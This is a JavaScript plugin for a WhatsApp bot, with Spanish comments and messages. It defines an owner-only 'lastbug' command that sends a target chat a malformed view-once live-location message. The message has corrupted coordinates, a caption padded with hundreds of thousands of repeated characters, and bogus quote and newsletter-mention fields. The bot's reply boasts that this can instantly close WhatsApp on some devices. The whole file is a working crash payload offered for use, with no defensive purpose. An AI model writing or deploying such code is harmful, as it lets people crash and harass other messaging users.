const LastLevelSystemUi = async (rxhl, target) => {
  await rxhl.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: 'p', // valor corrupto
            degreesLongitude: 'p', // valor corrupto
            caption: 'Hey Dog🐶' + 'ꦿꦸ'.repeat(150000) + '@1'.repeat(70000),
            sequenceNumber: '0',
            jpegThumbnail: '',
            contextInfo: {
              forwardingScore: 127,
              isForwarded: true,
              quotedMessage: {
                documentMessage: {
                  contactVcard: true
                }
              },
              groupMentions: [{
                groupJid: '1@newsletter',
                groupSubject: 'RxhL'
              }]
            }
          }
        }
      }
    },
    {
      participant: {
        jid: target
      }
    }
  );
};

let handler = async (m, { conn, isOwner }) => {
  if (!isOwner) throw '⛔ Este comando solo está disponible para el Owner del bot.';

  await LastLevelSystemUi(conn, m.chat);
  await m.reply('☣️ *Bug LastLevel enviado correctamente.*\n⚠️ Puede cerrar WhatsApp al instante en algunos dispositivos.');
};

handler.command = /^lastbug$/i;
handler.owner = true;
handler.tags = ['owner'];
handler.help = ['lastbug'];

export default handler;
